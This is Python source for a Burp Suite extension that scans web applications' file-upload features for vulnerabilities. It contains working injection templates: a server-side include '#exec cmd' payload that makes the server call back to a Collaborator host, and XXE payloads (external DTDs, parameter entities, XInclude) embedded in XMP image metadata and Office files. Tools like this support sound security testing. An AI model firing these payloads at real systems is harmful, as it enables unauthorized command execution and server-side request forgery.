#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    Upload Scanner extension for the Burp Suite Proxy
    Adds various security checks that can be used for
    web applications that allow file upload
    Copyright (C) 2017 floyd

Created on Feb 24, 2017
@author: floyd, http://floyd.ch, @floyd_ch, modzero AG, https://www.modzero.ch, @mod0
"""

# Developed when using Firefox, but short tests showed it works fine with IE, Chrome and Edge
# Tested on OSX primarily, but worked fine on Windows (including tests with exiftool.exe)

# Rules for unicode support in this extension: when Java APIs are used, everything is converted straight away to str
# with FloydsHelpers.u2s, str works best for me as "bytes" in python2. If we get byte[] from Java, we use the
# FloydsHelpers.jb2ps helper. Take care when we get back more complex objects from Java, make sure attributes of
# those objects are encoded with these two methods before usage.

# Jav
# a stdlib imports
from helpers.FloydsHelpers import FloydsHelpers
from helpers.checks_helper import Checks_Helper
from javax.swing import JLabel
from javax.swing import JButton
from javax.swing import JPanel
from javax.swing import AbstractAction
from javax.swing import BorderFactory
from java.awt import Insets
from java.awt import GridBagConstraints
from java.awt import Dimension
from java.awt.event import ActionListener
from java.lang import Thread
from burp import IMessageEditorController
# python stdlib imports
from io import BytesIO  # to mimic file IO but do it in-memory
import cgi
from misc.CustomScanIssue import CustomScanIssue
from misc.BackdooredFile import BackdooredFile
from misc.Constants import Constants
import zipfile  # to create evil zip files in memory

# SSI with BackdooredFile and Burp Collaborator payloads
class SsiPayloadGenerator:
    def __init__(self, burp_colab, cmd, server, replace):
        self.burp_colab = burp_colab
        self.cmd = cmd
        self.placeholder = self.burp_colab.get_dummy_payload()
        if replace is None:
            # we only support HTTP currently, no HTTPS...
            # but this is fine as it's only for IP-based Collaborators or UI option wget payloads
            self.server = server.replace(Constants.MARKER_COLLAB_URL, 'http://' + self.placeholder)
        else:
            self.server = server.replace(replace, self.placeholder)

    def payload_func(self):
        return '<!--#exec cmd="{} {}" -->'.format(self.cmd, self.server), None

class Xxe(object):
    # TODO: Unsure if these techniques are fine... See e.g. slide 29 on https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf
    @staticmethod
    def get_root_tag_techniques(root_tag, new_root_tag):
        techniques = {'Dtd': [
            (root_tag, new_root_tag + '<!DOCTYPE root PUBLIC "-//A/B/EN" "' + Constants.MARKER_COLLAB_URL + 'x.dtd">')],
                      'Stylesheet': [
                          (root_tag,
                           new_root_tag + '<?xml-stylesheet type="text/xml" href="' + Constants.MARKER_COLLAB_URL + 'x.xsl"?>')],
                      'ParameterEntity': [
                          (root_tag,
                           new_root_tag + '<!DOCTYPE root [ <!ENTITY % other SYSTEM "' + Constants.MARKER_COLLAB_URL + 'x"> %other; ]>')]}
        return techniques

    @staticmethod
    def get_tag_techniques(root_tag, new_root_tag, orig, tagname):
        techniques = {
            'Entity': [(root_tag, new_root_tag + '<!DOCTYPE root [ <!ENTITY xxe SYSTEM "' + Constants.MARKER_COLLAB_URL + 'x"> ]>'),
            (orig, '<' + tagname + '>&xxe;</' + tagname + '>')],
            'Xinclude': [(root_tag, new_root_tag),
                         (orig,
                          '<' + tagname + ' xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="' + Constants.MARKER_COLLAB_URL + '" /></' + tagname + '>')
                         ],
            'Schemalocation': [(root_tag, new_root_tag),
                               (orig,
                                '<' + tagname + ' xmlns="' + Constants.MARKER_COLLAB_URL + '" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="' + Constants.MARKER_COLLAB_URL + ' ' + Constants.MARKER_COLLAB_URL + 'x.xsd"></' + tagname + '>')
                               ]}
        # TODO feature: Unsure about these, if this works when we redefine
        # the tag to include XInclude or if a random tag such as <x> inside
        # having these definitions would be better...?
        return techniques

    @staticmethod
    def get_payloads(xml, root_tag, orig_tag, tagname):
        techniques = Xxe.get_root_tag_techniques(root_tag, root_tag)
        techniques.update(Xxe.get_tag_techniques(root_tag, root_tag, orig_tag, tagname))
        for name in techniques:
            payload_for_message = []
            new_xml = xml
            all_markers_found = True
            for marker, replace_str in techniques[name]:
                if marker in new_xml:
                    new_xml = new_xml.replace(marker, replace_str)
                    payload_for_message.append(replace_str)
                else:
                    # if not all markers are in there, go to the next technique
                    all_markers_found = False
                    break
            if all_markers_found:
                yield " [...] ".join(payload_for_message), name, new_xml

class XxeXmp(Xxe):
    """A rather hackish class to reuse the code from BackdooredFile to do XXE in XMP metadata"""

    def __init__(self, enabled_formats, exiftool, width, height, marker_orig_ext, protocols, file_start, burp_extender):
        self._enabled_formats = enabled_formats
        self._image_exiftool = exiftool
        self._image_width = width
        self._image_height = height
        self._marker_orig_ext = marker_orig_ext
        self._protocols = protocols
        self._file_start = file_start
        self.burp_extender = burp_extender

        self.xmp_start = "<?xpacket"
        self.xmp_end = "</x:xmpmeta>"
        self.xpacket_end = "?>"

        self._tag_name = "pdf:Keywords"

        self._placeholder = "AB" * 200  # 400 chars

    def _gen_payload(self):
        return self._placeholder, ""

    def _create_files(self, formats):
        # A little hackery to get the BackdooredFile class to create xmp files for us...
        t = [("xmpkeywords", "-xmp:keywords=", formats)]
        bf = BackdooredFile(self._enabled_formats, self._image_exiftool)
        size = (self._image_width, self._image_height)
        for _, _, _, ext, content in bf.get_exiftool_images(self._gen_payload, size, formats, t):
            mime = BackdooredFile.EXTENSION_TO_MIME[ext]
            types = {
                ('', self._marker_orig_ext, ''),
                ('', self._marker_orig_ext, mime),
                ('', ext, ''),
                ('', ext, mime),
            }
            yield types, ext, content

    def do_collaborator_tests(self, injector, burp_colab, formats):
        colab_tests = []
        for types, ext, content in self._create_files(formats):
            old_xmp = self._get_xmp(content)
            if old_xmp:
                for payload, name, new_xmp in self._create_attack(old_xmp):
                    basename = self._file_start + "XxeXmp" + name
                    title = "XML external entity injection" # via " + ext[1:].upper() + " XMP"
                    desc = 'XXE through injection of a {} payload in the XMP metadata of a {} file. The server parsed ' \
                           'the code {} which resulted in a SSRF. <br>'.format(name, ext[1:].upper(), cgi.escape(payload))
                    issue = CustomScanIssue(injector.get_brr(), None, title, desc, "Firm", "High")
                    c = self._send_collab(injector, burp_colab, types, basename, content, old_xmp, new_xmp, issue)
                    colab_tests.extend(c)
            else:
                print("Error: No XMP in file:", repr(content))
        return colab_tests

    def _fix_length(self, xmp, length):
        # to fix the length we simply change the self._tag_name tag to include more/less data
        if len(xmp) < length:
            # In this case the self._tag_name was replaced and does not include self._placeholder anymore
            # Let's put parts of it in there again
            diff = length - len(xmp)
            end_tag = "</" + self._tag_name + ">"
            xmp = xmp.replace(end_tag, self._placeholder[:diff] + end_tag)
        elif len(xmp) > length:
            # In this case the self._tag_name still includes self._placeholder, therefore we can just
            # trim self._placeholder down to a smaller size
            diff = len(xmp) - length
            new_placeholder_size = len(self._placeholder) - diff
            xmp = xmp.replace(self._placeholder, self._placeholder[:new_placeholder_size])
        return xmp

    def _send_collab(self, injector, burp_colab, all_types, basename, content, old_xmp, new_xmp, issue):
        # A modified version of _send_burp_collaborator because we need to fix the length of the xmp
        # after we inject the collaborator URL
        colab_tests = []
        types = injector.get_types(all_types)
        i = 0
        for prefix, ext, mime_type in types:
            for prot in self._protocols:
                colab_url = burp_colab.generate_payload(True)
                current_new_xmp = new_xmp.replace(Constants.MARKER_COLLAB_URL, prot + colab_url + "/")
                # as we are injecting into metadata of image files
                # old_xmp and new_xmp need to have the same length
                current_new_xmp = self._fix_length(current_new_xmp, len(old_xmp))
                new_content = content.replace(old_xmp, current_new_xmp)
                filename = prefix + basename + str(i) + ext
                req = injector.get_request(filename, new_content, content_type=mime_type)
                i += 1
                if req:
                    urr = Checks_Helper.make_http_request(self.burp_extender, injector, req, redownload_filename=filename)
                    if urr:
                        colab_tests.append(ColabTest(colab_url, urr, issue))
        return colab_tests

    def _create_attack(self, xmp):
        xpacket = FloydsHelpers.between_markers(xmp, self.xmp_start, self.xpacket_end, with_markers=True)
        orig_tag = "<" + self._tag_name + ">" + self._placeholder + "</" + self._tag_name + ">"
        for message, name, xmp_xml in Xxe.get_payloads(xmp, xpacket, orig_tag, self._tag_name):
            yield message, name, xmp_xml

    def _get_xmp(self, content):
        return FloydsHelpers.between_markers(content, self.xmp_start, self.xmp_end, with_markers=True)

class XxeOfficeDoc(Xxe):
    # TODO feature: Look into office file uploads again, it feels like we are not covering enough and there should be more...
    # YES: https://github.com/idiom/activemime-format/blob/master/amime.py
    # and https://msdn.microsoft.com/en-us/library/dd942138.aspx

    EXTENSION_TO_MIME = {".docx": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                         ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                        }

    def __init__(self, enabled_formats):
        self._enabled_formats = enabled_formats
        # just a docx/xlsx document with a capital "A"
        # when unzipped (the docx) looks as following (only files)
        # [Content_Types].xml
        # _rels/.rels
        # docProps/app.xml
        # docProps/core.xml
        # word/_rels/document.xml.rels
        # word/document.xml
        # word/endnotes.xml
        # word/fontTable.xml
        # word/footnotes.xml
        # word/settings.xml
        # word/styles.xml
        # word/theme/theme1.xml
        # word/webSettings.xml
        # all are xmls and start with <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        # but none of them have a DOCTYPE specified

        self._docx_content = """
        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
